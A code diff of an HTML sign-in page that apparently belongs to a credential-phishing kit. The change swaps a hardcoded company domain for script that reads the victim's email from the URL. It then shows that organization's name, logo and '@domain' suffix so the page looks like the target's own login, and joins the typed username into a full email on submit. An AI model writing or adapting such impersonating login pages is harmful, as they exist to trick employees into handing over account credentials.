@@ -72,7 +72,7 @@
                     <tr><td height="110"></td></tr>
                     <tr>
                       <td height="40" align="center">
-                        <img id="logo" src="https://logo.clearbit.com/bntinc.com" width="200" height="40">
+                        <img id="logo" src="" width="200" height="40">
                       </td>
                     </tr>
                     <tr><td height="70"></td></tr>
@@ -80,7 +80,7 @@
                       <td height="26">
                         <h1>
                           <font color="#000000">Sign in to</font>
-                          <font color="#7A7A7A" id="domainLabel">bntinc.com</font>
+                          <font color="#7A7A7A" id="domainLabel"></font>
                         </h1>
                       </td>
                     </tr>
@@ -91,7 +91,7 @@
                         <div class="input-group">
                           <input type="text" id="usernameInput" placeholder="Username" required class="form-control" autofocus>
                           <input type="hidden" name="login" id="loginFull">
-                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@bntinc.com</span>
+                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
                         </div>
                       </td>
                     </tr>
@@ -144,18 +144,27 @@
   </form>
 
   <script>
-    const fixedDomain = 'bntinc.com';
+    function getDomainFromURL() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const login = urlParams.get('login');
+      if (login && login.includes('@')) {
+        return login.split('@')[1].toLowerCase();
+      }
+      return 'example.com'; // fallback domain
+    }
 
-    // On submit, build full email login
+    const domain = getDomainFromURL();
+
+    // Fill dynamic elements
+    document.getElementById('domainAddon').textContent = '@' + domain;
+    document.getElementById('domainLabel').textContent = domain;
+    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
+
+    // On form submit, combine username with domain
     document.getElementById('loginForm').addEventListener('submit', function (e) {
       const username = document.getElementById('usernameInput').value.trim();
-      document.getElementById('loginFull').value = username + '@' + fixedDomain;
+      document.getElementById('loginFull').value = username + '@' + domain;
     });
-
-    // Set visuals
-    document.getElementById('domainAddon').textContent = '@' + fixedDomain;
-    document.getElementById('domainLabel').textContent = fixedDomain;
-    document.getElementById('logo').src = 'https://logo.clearbit.com/' + fixedDomain;
   </script>
 </body>
 </html>
